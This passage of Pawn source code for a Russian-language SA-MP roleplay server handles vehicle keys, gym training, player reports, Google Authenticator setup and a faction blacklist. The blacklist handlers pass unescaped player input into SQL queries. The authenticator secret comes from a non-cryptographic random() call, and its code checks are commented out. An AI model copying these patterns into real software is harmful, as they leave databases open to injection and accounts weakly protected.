			SetPlayerVirtualWorld(playerid, BizzInfo[index][bVirtual]);

			//PI[playerid][P_REALTOR_TYPE] = REALTOR_TYPE_NONE;
		}
    }
	if(PRESSED(KEY_ACTION))
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
		if(GetPVarInt(playerid, "InShop") || InShop[playerid]) return 1;
		new cars = 0, vehicleid = GetPlayerVehicleID(playerid);
		for(new i; i != sizeof(BE_Bad_Vehs); i++)
		{
			if(GetVehicleModel(vehicleid) == BE_Bad_Vehs[i]) cars++;
		}
		/*if(GetArendCarID(vehicleid, arend_id) != (-1))
	    {
	        new rc = GetArendCarID(vehicleid);
	        if(ArendInfo[rc][aPlayerID] != playerid) return 1;
	    }*/
    	if(IsAPlane(vehicleid) || IsAVel(vehicleid)) return 1;
		if(GetVehicleData(vehicleid, veh_fuel) <= 0 && GetVehicleModel(vehicleid) != 462) return SendClientMessage(playerid, COLOR_GREY, "В транспорте закончился бензин, необходима заправка!");
 	    new Float:vehhealth;
		GetVehicleHealth(vehicleid, vehhealth);
		if(vehhealth <= 400 && cars == 0) return SendClientMessage(playerid, COLOR_GREY, "Машина поломана, вызовите механика!");
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vehicleid,(GetVehicleData(vehicleid, veh_engine))?(false):(true),lights,alarm,doors,bonnet,boot,objective);
		SetVehicleData(vehicleid, veh_engine, GetVehicleData(vehicleid, veh_engine)?(false):(true));
		return 1;
	}
	if(PRESSED(KEY_FIRE))
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
		new cars = 0, vehicleid = GetPlayerVehicleID(playerid);
		for(new i; i != sizeof(BE_Bad_Vehs); i++)
		{
			if(GetVehicleModel(vehicleid) == BE_Bad_Vehs[i]) cars++;
		}
		if(cars > 0) return 1;
		if(IsAVel(vehicleid) || IsABoat(vehicleid)) return 1;
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vehicleid,engine,(GetVehicleData(vehicleid, veh_lights))?(false):(true),alarm,doors,bonnet,boot,objective);
		SetVehicleData(vehicleid, veh_lights, GetVehicleData(vehicleid, veh_lights)?(false):(true));
		// PlayerPlaySound(playerid, 4604, 0.0, 0.0, 0.0);
		return 1;
	}
	/*if(pCuff[playerid][pCuffee] == playerid)
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			//if((newkeys & KEY_JUMP || newkeys & KEY_FIRE || newkeys & KEY_CROUCH || (newkeys & KEY_HANDBRAKE && newkeys & KEY_SECONDARY_ATTACK)))
			if(newkeys & KEY_SECONDARY_ATTACK)
			{
				ClearAnimations(playerid);
				SetTimerEx("Unfreez2",3000,false,"i",playerid);
				TogglePlayerControllable(playerid,0);
				TogglePlayerControllable(playerid, 1);
				SendClientMessage(playerid, COLOR_GREY, "Вы не можете использовать это действие так как Вы в наручниках.");
			}
		}
	}*/
	if(newkeys == KEY_CROUCH) // 2 это ид кнопки, не трогать
	{
	    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
        {
		    /*for(new i = TOTALBIZZ; i > 0; i --) // Заправка
		    {
			    if(IsPlayerInRangeOfPoint(playerid, 5.0, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])	&& BizzInfo[i][bType] == 2)
			    {
			        new vehicleid = GetPlayerVehicleID(playerid);
			        if(GetVehicleData(vehicleid, veh_engine) == true) return SendClientMessage(playerid, COLOR_WHITE, "Заглушите двигатель!");
			        if(PlayersMenu[playerid] > 0) return SendMess(playerid, MSG_BAC_TEXT_DRAW);
			        for(new v; v < 5; v++) PlayerTextDrawShow(playerid, PlayerMenu[playerid][v]);
					for(new v; v < 3; v++) TextDrawShowForPlayer(playerid, KolvDialog[v]);
					for(new v; v < 3; v++) PlayerTextDrawShow(playerid, NameDialog[playerid][v]);
					PlayerTextDrawSetString(playerid, PlayerMenu[playerid][2], "Меню АЗС");
					PlayerTextDrawSetString(playerid, NameDialog[playerid][0], "Топливо");
					PlayerTextDrawSetString(playerid, NameDialog[playerid][1], "Канистра");
					PlayerTextDrawSetString(playerid, NameDialog[playerid][2], "Инструменты");
					PlayersMenu[playerid] = 3;//3 - АЗС
					SelectTextDraw(playerid, 0xFF4040AA);
				    SetPVarInt(playerid, "FuelBizzID", i);
			    }
		    }*/
			new a = GetPVarInt(playerid, "PlayerHouse");
			if(IsPlayerInRangeOfPoint(playerid, 15.0, -1616.6018,1579.0420,2005.5146) && GetPlayerVirtualWorld(playerid) == HouseInfo[a][hVirtual])
			{
				SetVehiclePos(GetPlayerVehicleID(playerid), HouseInfo[a][hCarx], HouseInfo[a][hCary], HouseInfo[a][hCarz]);
				PutPlayerInVehicle(playerid, GetPlayerVehicleID(playerid), 0);
				SetVehicleZAngle(GetPlayerVehicleID(playerid), HouseInfo[a][hCarfa]);
				SetCameraBehindPlayer(playerid);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid), 0);
				SetPlayerInterior(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), 0);
				SendClientMessage(playerid, COLOR_GREEN, "Чтобы припарковать автомобиль в гараж, нажмите клавишу сигнала 'H' на месте выезда из гаража");
				SetPVarInt(playerid, "antiflood_garage", 1);
			}
			for(new i = TOTALBIZZ; i > 0; i --)
			{
				if(IsPlayerInRangeOfPoint(playerid, 10.0, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]) && BizzInfo[i][bType] == 7)
				{
					new vehicleid = GetPlayerVehicleID(playerid);

					if(GetVehicleData(vehicleid, veh_owner_id) != playerid)
						return SendClientMessage(playerid, -1, "Вы должны находиться в личном автомобиле");

					if(GetVehicleModel(vehicleid) == 462) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете тюнинговать мопед!");
                    SendClientMessage(playerid, COLOR_GREY, "СТО Временно закрыто!");
					ShowPlayerDialog(playerid, D_CTO, DIALOG_STYLE_MSGBOX, BizzInfo[i][bName], "{FFFFFF}\n\nТут Вы можете прокачать свое авто\nВы хотите перейти к тюнингу вашего авто?\n\n", "Да", "Отмена");
					SetPVarInt(playerid, "CTObizzid", i);
				}
			}
		}
 	    return 1;
	}
	if(!IsACop(playerid) || !IsAArmy(playerid) || !IsAMayor(playerid))
	{
	    if(!PI[playerid][pAdmin])
	    {
			for(new i; i < sizeof(AreaInfo[arGreenZone]); i++)
			{
				if(IsPlayerInDynamicArea(playerid, AreaInfo[arGreenZone][i]))
				{
					new index = GetPlayerAnimationIndex(playerid);
					if(index >= 1136 && index <= 1138 || index == 504 || index == 505 || index == 1141 || (oldkeys & 128 && newkeys & 16))
					{
						if(GetPlayerWeapon(playerid) != 43 && GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DRINK_SPRUNK && GetPlayerSpecialAction(playerid)!= SPECIAL_ACTION_DRINK_WINE && GetPlayerSpecialAction(playerid)!= SPECIAL_ACTION_SMOKE_CIGGY && GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DRINK_BEER)
						{
							ApplyAnimation(playerid, "FAT", "IDLE_tired", 3.0, 1, 0, 0, 1, 3000);
							SetTimerEx("ClearAnimationsDelay", 3000, false, "i", playerid);
							if(!GetPVarInt(playerid, "SwitchingTextdraw"))
							{
								SetTimerEx("WarningGreenZone", 3000, false, "i", playerid);
								SetPVarInt(playerid, "SwitchingTextdraw", 1);
							}
						}
					}
				}
			}
		}
	}
	if(!IsPlayerInAnyVehicle(playerid))
	{
		if((oldkeys & 128 && newkeys & 16))
		{
			if(IsPlayerInRangeOfPoint(playerid, 20.0,-341.2002,438.6825,2513.6538))
			{
				//if(!gym_cloakroom[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Вы не переоделись!");
				if(!gym_cloakroom[playerid]) return 1;
				switch(random(3))
				{
					case 1:
					{
						PlayerPlaySound(playerid, (random(2)==0)?(17805):(17806), 0.0, 0.0, 0.0);
						PI[playerid][pSportExp]++;
						new string[20];
						if(PI[playerid][pSportExp] <= 1000) format(string, sizeof(string), "%d/1000", PI[playerid][pSportExp]);
						else if(PI[playerid][pSportExp] <= 3000) format(string, sizeof(string), "%d/3000", PI[playerid][pSportExp]);
						else if(PI[playerid][pSportExp] <= 6000) format(string, sizeof(string), "%d/6000", PI[playerid][pSportExp]);
						else format(string, sizeof(string), "%d", PI[playerid][pSportExp]);
						GameTextForPlayer(playerid, string, 500, 6);
						if(PI[playerid][pSportExp] == 1000)
						{
							SendClientMessage(playerid,COLOR_WHITE,"Вы выучили новый стиль боя 'Бокс' 1000 ударов, используйте /fstyle 1");
							PI[playerid][pFightStyle] = 5;
							SendClientMessage(playerid, COLOR_WHITE, "Осталось открыть 2 стиля боя, требуется еще 2000 ударов");
						}
						if(PI[playerid][pSportExp] == 3000)
						{
							SendClientMessage(playerid,COLOR_WHITE,"Вы выучили новый стиль боя 'Кунг-фу' 3000 ударов, используйте /fstyle 2");
							PI[playerid][pFightStyle] = 6;
							SendClientMessage(playerid, COLOR_WHITE, "Осталось открыть 1 стиль боя, требуется еще 3000 ударов");
						}
						if(PI[playerid][pSportExp] == 6000)
						{
							SendClientMessage(playerid,COLOR_WHITE,"Вы выучили новый стиль боя 'Кикбокс' 6000 ударов, используйте /fstyle 3");
							PI[playerid][pFightStyle] = 7;
							SendClientMessage(playerid, COLOR_WHITE, "Вы выучили все стили боя! Поздравляем!");
						}

						MysqlUpdatePlayerInt(playerid, "fstyle", PI[playerid][pFightStyle]);
						MysqlUpdatePlayerInt(playerid, "sportexp", PI[playerid][pSportExp]);
					}
				}
			}
		}
	}
	return 1;
}

public OnPlayerUpdate(playerid)
{
	PI[playerid][pAFK] = 0;

	PI[playerid][NewPlayerAmmo] = GetPlayerAmmo(playerid);
	if(PI[playerid][NewPlayerAmmo] != PI[playerid][PlayerAmmo])
	{
		OnPlayerAmmoChange(playerid, PI[playerid][NewPlayerAmmo], PI[playerid][PlayerAmmo]);
		PI[playerid][PlayerAmmo] = PI[playerid][NewPlayerAmmo];
	}
	if(g_CefLoaded[playerid] && g_HudVisible[playerid])
    {
        UpdatePlayerHud(playerid); // Обновляем HUD при каждом обновлении игрока
    }
	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
    if(Settings[forplayerid][7] == 1) ShowPlayerNameTagForPlayer(forplayerid,playerid,0);
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
	return 1;
}

stock ShowAdminBizzPanel(playerid)
{
	new gText[] = "{0099FF}1. {FFFFFF}Информация о бизнесе\n\
		{0099FF}2. {FFFFFF}Открыть бизнес\n\
		{0099FF}3. {FFFFFF}Установить цену за товар\n\
		{0099FF}4. {FFFFFF}Установить цену за вход\n\
		{0099FF}5. {FFFFFF}Продать бизнес\n\
		{0099FF}6. {FFFFFF}Изменить количество продуктов\n\
		{0099FF}7. {FFFFFF}Телепортироваться к бизнесу\n";

	ShowPlayerDialog(playerid, DLG_ADM_BIZZ_MENU_1, DIALOG_STYLE_LIST, "Панель управления бизнесом", gText, "Выбрать", "Назад");
	return 1;
}
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	printf("%s[%d] - dialogid: %d response: %d listitem: %d inputtext: %s", GetName(playerid), playerid, dialogid, response, listitem, inputtext);

    if(playerid == INVALID_PLAYER_ID) return SKick(playerid, 7433);
	if(GetPVarInt(playerid, "DialogResponseTime") > GetTickCount()) return SKick(playerid, 2178);
	else SetPVarInt(playerid, "DialogResponse", GetTickCount()+230);
	if(strlen(inputtext) > 0)
	{
		for(new i; i < strlen(inputtext); i++)
		{
	     	if(inputtext[i] == '%') inputtext[i] = '#';
	     	else if(inputtext[i] == '{' && inputtext[i+7] == '}') strdel(inputtext, i, i+8);
		}
	}
	if(GetPVarInt(playerid,"USEDIALOGID") != dialogid) return 1;
	SetPVarInt(playerid, "USEDIALOGID", -1);
	if(PlayerLogged[playerid] == true)
	{
		if(response) PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
		else PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
	}
 	switch(dialogid)
	{
		case DIALOG_GOOGLE:
		{
		    if(!response) return 1;

			if(response)
		    {
				switch(listitem)
	            {
					case 0:
					{
					    if(strlen(PI[playerid][GOOGLEAUTH]) > 1)
					    {
					        STRING_GLOBAL[0] = EOS;
						    format
							(
								STRING_GLOBAL, sizeof(STRING_GLOBAL),
								"Установить Google Authenticator\n"\
								"Удалить Google Authenticator\n"\
								"Спрашивать Google Authenticator %s",
								(PI[playerid][GOOGLEAUTHSETTING] == 0) ? ("{32CD32}[При смене IP]") : ("{0089ff}[Всегда]")
							);
							ShowPlayerDialog(playerid, DIALOG_GOOGLE, DIALOG_STYLE_LIST, !"{FFCC00}Управление Google Authenticator", STRING_GLOBAL, !"Выбрать", !"Закрыть");
							return SendClientMessage(playerid,C_RED,"У вас уже установлен Google Authenticator");
					    }
						PI[playerid][GOOGLEAUTH] = EOS;
						for(new i; i < 16; i++)
						{
						    PI[playerid][GOOGLEAUTH][i] = random(25) + 65;
						}

						STRING_GLOBAL[0] = EOS;
					 	format
						(
							STRING_GLOBAL, sizeof(STRING_GLOBAL),
							"{FFFFFF}Данная функция необходима для увелечения безопасности Вашего аккаунта.\n\n"\
							"Активировав Google Authenticator Вы получите бонус в размере 50000 рублей при достижении 4-го уровня.\n\n"\
							"Скачайте и установите приложение Google Authenticator на ваше мобильное устройство\n"\
							"Если у вас Android, то нажмите кнопку '+' в правом верхнем углу и выберите \"Ввести ключ\"\\n"\
							"Если у вас IOS, то нажмите кнопку '+' в правом верхнем углу и выберите \"Ввод вручную\"\n\n"\
							"В поле \"Аккаунт\" введите: {0089ff}%s@alliancerp{FFFFFF}\n"\
							"В поле \"Ключ\" введите: {0089ff}%s{FFFFFF}\n\n"\
							"После добавления аккаунта нажмите кнопку \"Далее\"\n"\
							"Часовой пояс установленный на телефоне, должен совпадать тому, что установлен на сервере",
							GetName(playerid), PI[playerid][GOOGLEAUTH]
						);
						ShowPlayerDialog(playerid, DIALOG_GOOGLE_SET, DIALOG_STYLE_MSGBOX, !"{FFCC00}Установка Google Authenticator", STRING_GLOBAL, "Далее", "");
					}
					case 1:
					{
					    if(strlen(PI[playerid][GOOGLEAUTH]) == 1)
						{
							STRING_GLOBAL[0] = EOS;

						    format
							(
								STRING_GLOBAL, sizeof(STRING_GLOBAL),
								"Установить Google Authenticator\n"\
								"Удалить Google Authenticator\n"\
								"Спрашивать Google Authenticator %s",
								(PI[playerid][GOOGLEAUTHSETTING] == 0) ? ("{32CD32}[При смене IP]") : ("{0089ff}[Всегда]")
							);

							ShowPlayerDialog(playerid, DIALOG_GOOGLE, DIALOG_STYLE_LIST, !"{FFCC00}Управление Google Authenticator", STRING_GLOBAL, !"Выбрать", !"Закрыть");
							return SendClientMessage(playerid,C_RED,"У вас не установлен Google Authenticator");
						}
                        PI[playerid][GOOGLEAUTH] = EOS;
                        strcat(PI[playerid][GOOGLEAUTH], "0");

                        SendClientMessage(playerid, C_OSNOV, "Google Authenticator удалён");

						STRING_GLOBAL[0] = EOS;
						mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET googleauth='%s' WHERE id=%d", PI[playerid][GOOGLEAUTH], PI[playerid][pID]);
						mysql_tquery(dbHandle, STRING_GLOBAL);
					}
					case 2:
					{
						if(strlen(PI[playerid][GOOGLEAUTH]) > 1)
						{
							PI[playerid][GOOGLEAUTHSETTING] = !PI[playerid][GOOGLEAUTHSETTING];

							if(PI[playerid][GOOGLEAUTHSETTING] == 0) SendClientMessage(playerid, C_OSNOV, "Ваш Google Authenticator теперь будет запрашиваться при каждой смене IP");
							else SendClientMessage(playerid, C_OSNOV, "Ваш Google Authenticator код теперь будет запрашиваться при каждом входе");

							STRING_GLOBAL[0] = EOS;
							mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET gs=%d WHERE id=%d", PI[playerid][GOOGLEAUTHSETTING], PI[playerid][pID]);
							mysql_tquery(dbHandle, STRING_GLOBAL);


							STRING_GLOBAL[0] = EOS;

							format
							(
								STRING_GLOBAL, sizeof(STRING_GLOBAL),
								"Установить Google Authenticator\n"\
								"Удалить Google Authenticator\n"\
								"Спрашивать Google Authenticator %s",
								(PI[playerid][GOOGLEAUTHSETTING] == 0) ? ("{32CD32}[При смене IP]") : ("{0089ff}[Всегда]")
							);

							ShowPlayerDialog(playerid, DIALOG_GOOGLE, DIALOG_STYLE_LIST, !"{FFCC00}Управление Google Authenticator", STRING_GLOBAL, !"Выбрать", !"Закрыть");
						}
						else SendClientMessage(playerid, COLOR_RED, "У Вас не установлен Google Authenticator");
					}
				}
		    }
		}
		case DIALOG_GOOGLE_SET:
		{
			if(response)
			{
				ShowPlayerDialog
				(
					playerid, DIALOG_GOOGLE_SET_CHECK, DIALOG_STYLE_INPUT,
					"{FFCC00}Установка Google Authenticator",
					"{FFFFFF}Для завершения установки Google Authenticator\nВведите код из приложения в поле ниже:",
					"Далее", "Отмена"
				);
			}
			else
			{
				PI[playerid][GOOGLEAUTH] = EOS;

				if(GetPVarInt(playerid, "register"))
				{
					SetPVarString(playerid, "reg_google_auth", "0");
					ShowDialogReferalPlayer(playerid);
				}
			}
		}
		/*case DIALOG_GOOGLE_SET_CHECK:
		{
			if(response)
			{
				new getcode = GoogleAuthenticatorCode(PI[playerid][GOOGLEAUTH], gettime());

				if(strval(inputtext) == getcode)
				{
					SendClientMessage(playerid, C_OSNOV, "Google Authenticator активирован");

					if(GetPVarInt(playerid, "register"))
					{
						SetPVarString(playerid, "reg_google_auth", PI[playerid][GOOGLEAUTH]);

						return ShowDialogReferalPlayer(playerid);
					}
					else
					{
						STRING_GLOBAL[0] = EOS;
						mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET googleauth='%s' WHERE id=%d", PI[playerid][GOOGLEAUTH], PI[playerid][pID]);
						mysql_tquery(dbHandle, STRING_GLOBAL);
					}
				}
				else
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_GOOGLE_SET_CHECK, DIALOG_STYLE_INPUT,
						"{FFCC00}Установка Google Authenticator",
						"{FFFFFF}Для завершения установки Google Authenticator\nВведите код из приложения в поле ниже:",
						"Далее", "Отмена"
					);

					return SendClientMessage(playerid, C_RED, "Ошибка! Код не совпадает");
				}
			}
		}
		case DIALOG_GOOGLE_CHECK:
		{
			new getcode = GoogleAuthenticatorCode(PI[playerid][GOOGLEAUTH], gettime());

			if(strval(inputtext) == getcode)
			{
				PlayerLogged[playerid] = true;
				TogglePlayerSpectating(playerid, false);
				SpawnPlayer(playerid);
			}
			else
			{
				ShowPlayerDialog(playerid, DIALOG_GOOGLE_CHECK, DIALOG_STYLE_INPUT, !"{FFCC00}Google Authenticator", !"{FFFFFF}Введите код из приложения Google Authenticator в поле ниже:", !"Далее", "");
				return SendClientMessage(playerid, C_RED, "Ошибка! Код не совпадает");
			}
		}*/
		case DIALOG_AUTOSCHOOL_CAR:
		{
			if(!response) return 1;
			if(GetMoney(playerid) < 1000) return SendMess(playerid, MSG_NOT_MONEY);
			if(g_player_skills[playerid][S_LICS][0]) return SendClientMessage(playerid, 0xcececeFF, "У вас уже имееются водительские права");
            ShowTestQuestion(playerid,0,5,D_ASHTEST+1);
            GiveMoney(playerid, -1000);
		}
		case DIALOG_GOOGLE_SET_REG:
		{
			if(response)
			{
				PI[playerid][GOOGLEAUTH] = EOS;
				for(new i; i < 16; i++)
				{
					PI[playerid][GOOGLEAUTH][i] = random(25) + 65;
				}

				STRING_GLOBAL[0] = EOS;
				format
				(
					STRING_GLOBAL, sizeof(STRING_GLOBAL),
					"{FFFFFF}Данная функция необходима для увелечения безопасности Вашего аккаунта.\n\n"\
					"Активировав Google Authenticator Вы получите бонус в размере 50000 рублей при достижении 4-го уровня.\n\n"\
					"Скачайте и установите приложение Google Authenticator на ваше мобильное устройство\n"\
					"Если у вас Android, то нажмите кнопку '+' в правом верхнем углу и выберите \"Ввести ключ\"\\n"\
					"Если у вас IOS, то нажмите кнопку '+' в правом верхнем углу и выберите \"Ввод вручную\"\n\n"\
					"В поле \"Аккаунт\" введите: {0089ff}%s@alliancerp{FFFFFF}\n"\
					"В поле \"Ключ\" введите: {0089ff}%s{FFFFFF}\n\n"\
					"После добавления аккаунта нажмите кнопку \"Далее\"\n"\
					"Часовой пояс установленный на телефоне, должен совпадать тому, что установлен на сервере",
					GetName(playerid), PI[playerid][GOOGLEAUTH]
				);
				ShowPlayerDialog(playerid, DIALOG_GOOGLE_SET, DIALOG_STYLE_MSGBOX, !"{FFCC00}Установка Google Authenticator", STRING_GLOBAL, "Далее", "");
			}
			else ShowDialogReferalPlayer(playerid);
		}
		case 799:
		{
			if(!response) return 1;
			if(isnull(inputtext)) return callcmd::report(playerid);

			new length = strlen(inputtext);
			if(!(3 <= length <= 120))
			{
				SendClientMessage(playerid, COLOR_GREY, !"Текст Вашего сообщения для администрации не соответствует длина 3-120 символов.");
				callcmd::report(playerid);
				return 1;
			}

			new
				string[144],
				hour,
				minute,
				second;


			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[Жалоба/Вопрос] %s[%d]: {ddffc4}%s", PI[playerid][pName], playerid, inputtext);
			SendAdminMessage(0xb8e994FF, STRING_GLOBAL);
			SendAdminMessage(0xb8e994FF, "Для ответа на поставленную жалобу используйте: {ddffc4}/rep");

			SendClientMessage(playerid, COLOR_ORANGE, !"Ваш репорт успешно отправлен администрации сервера. Пожалуйста, ожидайте ответ.");

			for(new i = 1; i < MAX_ADMIN_REPORTS; i++)
			{
				if(gReport[i][rPlayerID] != -1) continue;
				gReport[i][rIsTooked] = false;
				gReport[i][rID] = i;
				gReport[i][rPlayerID] = playerid;
				format(string, sizeof(string), "%s", inputtext);
				strmid(gReport[i][rText], string, 0, MAX_ADMIN_REPORT_TEXT_LENGTH, MAX_ADMIN_REPORT_TEXT_LENGTH);
				gReport[i][rWhenWroted_Time] = gettime();
				gettime(hour, minute, second);
				format(string, sizeof(string), "%02d:%02d:%02d", hour, minute, second);
				strmid(gReport[i][rWhenWroted_Text], string, 0, 10, 10);
				SetPVarInt(playerid, "report_id", i);
				break;
			}
		}
		case 800:
        {
            if(!response) return 1;
            if(gReport[listitem + 1][rIsTooked] == false) ShowPlayerAdminReportAnswer(playerid, listitem + 1);
            else SendClientMessage(playerid, COLOR_GREY, "На данную жалобу ответ не требуется. Ответ на нее уже есть.");
        }

        case 801:
        {
			new report_id = GetPVarInt(playerid, "report_id_to_answer"), target_id = gReport[report_id][rPlayerID];

			STRING_GLOBAL[0] = '\0';
			mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE "T_ADMIN" SET `ans` = ans+1 WHERE `name` = '%s'", GetName(playerid));
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

            if(!response)
            {
                gReport[GetPVarInt(playerid, "report_id_to_answer")][rIsTooked] = false;
                DeletePVar(playerid, "report_id_to_answer");
				SetPVarInt(gReport[report_id][rPlayerID], "report_id", 0);
				gReport[report_id][rPlayerID] = -1;
				SendClientMessage(playerid, COLOR_BBLUE, "Вы успешно удалили выбранную жалобу.");
                ShowPlayerAdminReportList(playerid);
				return 1;
            }

			if(isnull(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "Ваше сообщение пустое, потому его отправка игроку невозможна.");

			else
            {

                if(target_id == INVALID_PLAYER_ID)
                    return SendClientMessage(playerid, COLOR_GREY, "Игрок, создавший эту жалобу, уже отключен от сервера");

				format
				(
					STRING_GLOBAL, sizeof STRING_GLOBAL,
					"Администратор %s [%d] для %s[%d]: {ffffff}%s",
					GetName(playerid),
					playerid,
					GetName(target_id),
					target_id,
					inputtext
				);

				SendAdminMessage(0xFFAA44FF, STRING_GLOBAL);
				SendClientMessage(target_id, 0xFFAA44FF, STRING_GLOBAL);

                DeletePVar(target_id, "report_id");

                gReport[report_id][rIsTooked] = false;
                gReport[report_id][rID] = report_id;
                gReport[report_id][rPlayerID] = -1;
                gReport[report_id][rText][0] = EOS;
                gReport[report_id][rWhenWroted_Time] = -1;
                gReport[report_id][rWhenWroted_Text][0] = EOS;

				admin_reports_cleaner();
            }
		}
		case D_BLACKLIST: // черный список фракций
		{
			if(!response) return 1;

			switch(listitem)
			{
				case 0: // добавить в ЧС
				{
					ShowPlayerDialog(playerid, D_BLACKLIST+1, DIALOG_STYLE_INPUT, "Добавление в черный список", "Введите nick-name игрока, которого необходимо добавить в черный список", "Готово", "Назад");
				}
				case 1: // удалить из черного списка
				{
					ShowPlayerDialog(playerid, D_BLACKLIST+3, DIALOG_STYLE_INPUT, "Вынесение из черного списка", "Введите nick-name игрока, которого хотите удалить из черного списка", "Готово", "Назад");
				}
				case 2: // проверить в черном списке
				{
					ShowPlayerDialog(playerid, D_BLACKLIST+4, DIALOG_STYLE_INPUT, "Проверка черного списка", "Введите nick-name игрока, наличие в черном списке которого Вы хотите проверить", "Готово", "Назад");
				}
			}
		}
		case D_BLACKLIST+1: // добавить в ЧС
		{
			if(!response) return callcmd::blacklist(playerid);

			if(isnull(inputtext)) return ShowPlayerDialog(playerid, D_BLACKLIST+1, DIALOG_STYLE_INPUT, "Добавление в черный список", "Введите nick-name игрока, которого необходимо добавить в черный список", "Готово", "Назад");

			new length = strlen(inputtext);
			if(!(5 <= length < MAX_PLAYER_NAME))
				return ShowPlayerDialog(playerid, D_BLACKLIST+1, DIALOG_STYLE_INPUT, "Добавление в черный список", "Введите nick-name игрока, которого необходимо добавить в черный список", "Готово", "Назад");

			STRING_GLOBAL[0] = '\0';
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT id FROM blacklist WHERE name = '%s' LIMIT 1", inputtext);
			new Cache:result = mysql_query(dbHandle, STRING_GLOBAL);

			if(cache_num_rows())
			{
				SendClientMessage(playerid, COLOR_DARKORANGE, "Игрок с указанным Вами ником уже присутствует в черном списке фракций.");
				ShowPlayerDialog(playerid, D_BLACKLIST+1, DIALOG_STYLE_INPUT, "Добавление в черный список", "Введите nick-name игрока, которого необходимо добавить в черный список", "Готово", "Назад");
				return 1;
			}

			SetPVarString(playerid, "black_name", inputtext);

			ShowPlayerDialog(playerid, D_BLACKLIST+2, DIALOG_STYLE_INPUT, "Добавление в черный список", "Введите причину, по которой хотите занести указанного игрока в черный список", "Готово", "Закрыть");
			cache_delete(result);
		}
		case D_BLACKLIST+2:
		{
			if(!response) return ShowPlayerDialog(playerid, D_BLACKLIST+1, DIALOG_STYLE_INPUT, "Добавление в черный список", "Введите nick-name игрока, которого необходимо добавить в черный список", "Готово", "Назад");

			if(isnull(inputtext)) return ShowPlayerDialog(playerid, D_BLACKLIST+2, DIALOG_STYLE_INPUT, "Добавление в черный список", "Введите причину, по которой хотите занести указанного игрока в черный список", "Готово", "Закрыть");
			new length = strlen(inputtext);
			if(!(1 <= length < 64)){
				SendClientMessage(playerid, COLOR_DARKORANGE, "Причина занесения в черный список определяется длиной 1-64 символов.");
				ShowPlayerDialog(playerid, D_BLACKLIST+2, DIALOG_STYLE_INPUT, "Добавление в черный список", "Введите причину, по которой хотите занести указанного игрока в черный список", "Готово", "Закрыть");
				return 1;
			}

			new name[MAX_PLAYER_NAME+1];
			GetPVarString(playerid, "black_name", name, MAX_PLAYER_NAME);

			STRING_GLOBAL[0] = '\0';
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO blacklist (name, reason, fname) VALUES ('%s', '%s', '%s')", name, inputtext, PI[playerid][pName]);
			mysql_tquery(dbHandle, STRING_GLOBAL);

			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Игрок %s успешно занесен вами в черный список. Причина: %s", name, inputtext);
			SendClientMessage(playerid, COLOR_GREEN, STRING_GLOBAL);
		}
		case D_BLACKLIST+3:
		{
			if(!response) return callcmd::blacklist(playerid);

			if(isnull(inputtext)) return ShowPlayerDialog(playerid, D_BLACKLIST+3, DIALOG_STYLE_INPUT, "Вынесение из черного списка", "Введите nick-name игрока, которого хотите удалить из черного списка", "Готово", "Назад");

			new length = strlen(inputtext);
			if(!(5 <= length <= MAX_PLAYER_NAME)) return ShowPlayerDialog(playerid, D_BLACKLIST+3, DIALOG_STYLE_INPUT, "Вынесение из черного списка", "Введите nick-name игрока, которого хотите удалить из черного списка", "Готово", "Назад");

			STRING_GLOBAL[0] = '\0';
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "DELETE FROM blacklist WHERE name = '%s' LIMIT 1", inputtext);
			mysql_tquery(dbHandle, STRING_GLOBAL);

			SendClientMessage(playerid, COLOR_DARKORANGE, "Указанный Вами игрок успешно вынесен из черного списка");
		}
		case D_BLACKLIST+4:
		{
			if(!response) return callcmd::blacklist(playerid);

			if(isnull(inputtext)) return ShowPlayerDialog(playerid, D_BLACKLIST+4, DIALOG_STYLE_INPUT, "Проверка черного списка", "Введите nick-name игрока, наличие в черном списке которого Вы хотите проверить", "Готово", "Назад");

			new length = strlen(inputtext);
			if(!(5 <= length <= MAX_PLAYER_NAME)) return ShowPlayerDialog(playerid, D_BLACKLIST+4, DIALOG_STYLE_INPUT, "Проверка черного списка", "Введите nick-name игрока, наличие в черном списке которого Вы хотите проверить", "Готово", "Назад");

			STRING_GLOBAL[0] = '\0';
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM blacklist WHERE name = '%s' LIMIT 1", inputtext);
